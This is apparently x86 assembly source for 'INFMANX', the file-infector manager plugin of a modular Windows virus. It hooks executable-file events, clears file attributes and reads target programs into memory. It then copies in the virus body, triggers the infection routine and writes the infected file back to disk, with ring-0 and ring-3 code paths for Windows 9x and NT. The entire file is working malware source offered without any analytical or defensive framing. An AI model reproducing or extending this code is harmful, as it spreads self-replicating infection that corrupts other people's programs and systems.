   ; INFMANX
   ; ~~~~~~~
   ; - file-infector manager
   ; - reads file into memory
   ; - calls some events, including EV_INFMANX_INFECTINMEM (see INFECT1 plugin)

   INFECT_MIN_SIZE         equ     8192    ; min file size
   INFECT_MAX_SIZE         equ     262144  ; max size
   INFECT_ADD_SIZE         equ     65536   ; add to size when allocating memory

   include                 INCLUDE\consts.inc
   include                 memory.inc
   include                 system.inc
   include                 k32man.inc
   include                 pentry.inc
   include                 extman.inc
   include                 rxio.inc
   include                 r0io.inc
   include                 r3io.inc
   include                 aav.inc
   include                 badfile.inc
   include                 fastname.inc
   include                 util.inc
   include                 uncall.inc

   include                 plugin.inc
                           PLUGIN_START    INFMANX, CODE32, PERMUTABLE

   handleevent:            hookevent EV_EXTMAN_GOT_EXECEXT, process_infect ; edx=fname
                           hookevent EV_INFMANX_DO_INFECT, process_infect
                           stc
                           retn

   ; input:   EDX=filename
   ; returns: EAX=1 - infected
   ;          EAX=0 - not infected

   process_infect:         pusha

                           movzx   esi, ax                 ; esi=event
                           mov     [esp].pusha_eax, 0      ; result=0

                           event   EV_AAV_ISBADNAME
                           jnc     __exit

                           event   EV_BADFILE_ISBADFILE
                           jnc     __exit

                           event   EV_FASTNAME_ISNEWFILE
                           jnc     __exit

                           IS_RING0        ; EAX changed
                           jz      __skiptouch ; continue only in ring3

                           ; if we're directly asked to infect,
                           ; do not pass to ring0
                           cmp     esi, EV_INFMANX_DO_INFECT
                           je      __skiptouch

                           event   EV_UTIL_IS_W9X
                           je      __onlytouch ; win9X,r3: touch --> r0
   __skiptouch:                                ; winNT,r3: continue infect in r3

                           ; easy way to check if file is opened
                           event   EV_rx_fgetattr     ; get attribs (ECX)
                           jc      __exit

                           IS_RING0        ; EAX changed
                           jz      __skipclearattr
                           and     ecx, not (1+2+4)   ; ring-3: clear: h,s,r
   __skipclearattr:
                           event   EV_rx_fsetattr     ; set attribs (ECX)
                           jc      __exit

                           IS_RING0        ; EAX changed
                           jz      __open_r0

   __open_r3:              event   EV_rx_fopen_rw ; r3: open in read-write mode
                           jmp     __check_opened

   __open_r0:              event   EV_rx_fopen_ro ; r0: open in read-only mode
   __check_opened:         jc      __exit

                           xchg    ebx, eax

                           event   EV_rx_fgetsize     ; get file size
                           jc      __close
                           mov     esi, eax        ; ESI = file size

                           sub     eax, INFECT_MIN_SIZE    ; check file size
                           cmp     eax, INFECT_MAX_SIZE-INFECT_MIN_SIZE
                           ja      __close

                           lea     ecx, [esi+INFECT_ADD_SIZE]
                           event   EV_MEMORY_MALLOC
                           jz      __close

                           ; read whole file into memory
                           pusha
                           mov     ecx, esi        ; ecx=size
                           xor     esi, esi        ; esi=pos
                           event   EV_rx_fread
                           popa

                           ; make virus copy
                           pusha
                           event   EV_SYSTEM_GET_VIR_SIZE  ; returns: ESI & ECX
                           mov     [esp].popa_ecx, ecx  ; popa.ecx = virsize
                           push    ecx
                           add     ecx, 65536
                           event   EV_MEMORY_MALLOC
                           pop     ecx
                           jz      __popa_close
                           mov     edi, edx
                           mov     [esp].popa_edi, edi  ; popa.edi = virstart
                           cld
                           rep     movsb
                           popa

                           pusha
                           mov     esi, edi
                           event   EV_UNCALL_RANGE         ; esi, ecx
                           event   EV_INFMANX_BEFORE_VIRUS  ; esi, ecx
                           mov     [esp].popa_ecx, ecx  ; popa.ecx
                           popa

                           pusha
                           mov     ecx, esi
                           mov     esi, edx
                           event   EV_INFMANX_BEFORE_FILE   ; esi, ecx
                           mov     [esp].popa_esi, ecx
                           popa

                           ; now. EAX=# of bytes changed

                           ; infect file in memory
                           pusha
                           push    edx                     ; EDX=fileptr
                           push    esi                     ; ESI=filesize
                           push    edi                     ; virstart
                           push    ecx                     ; virsize
                           ;;
                           push    ebp
                           lea     ebp, [edi+size plugin_struc]
                           event   EV_PENTRY_PREPARE2INFECT
                           pop     ebp
                           ;;
                           push    esi                     ; virentry (rel2start)
                           push    edi                     ; oldeip (rel2start)
                           mov     edx, esp
                           event   EV_INFMANX_INFECTINMEM
                           lea     esp, [esp+6*4]
                           mov     [esp].popa_esi, eax  ; popa.esi == new file size
                           popa

                           jc      __skip_update

                           pusha
                           mov     ecx, esi
                           mov     esi, edx
                           event   EV_INFMANX_AFTER_FILE    ; esi, ecx
                           mov     [esp].popa_esi, ecx  ; popa.esi
                           popa

                           ; if infected, write file back to disk
                           pusha

                           IS_RING0        ; EAX changed
                           jnz     __skipshare1
                           event   EV_r0_make_handle_rw       ; fuck share
   __skipshare1:
                           mov     ecx, esi        ; ecx=size
                           xor     esi, esi        ; esi=pos
                           event   EV_rx_fwrite

                           IS_RING0        ; EAX changed
                           jnz     __skipshare2
                           event   EV_r0_make_handle_ro       ; restore share
   __skipshare2:
                           popa

                           inc     [esp].popa_eax  ; damn, its infected!

                           ; free memory
   __skip_update:          event   EV_MEMORY_MFREE ; free file copy in memory

                           mov     edx, edi
                           event   EV_MEMORY_MFREE ; free virus copy

                           ; close file
   __close:                event   EV_rx_fclose    ; close fucken file

   __exit:                 popa
                           clc
                           retn

   __popa_close:           popa
                           jmp     __close

   ; we're under win9X in ring3, so - touch file, passing it to ring-0

   __onlytouch:            event   EV_r3_fgetattr     ; get attribs (ECX)

   __quit_unhandled:       popa
                           stc     ; as if event was unhandled
                           retn


                           PLUGIN_END
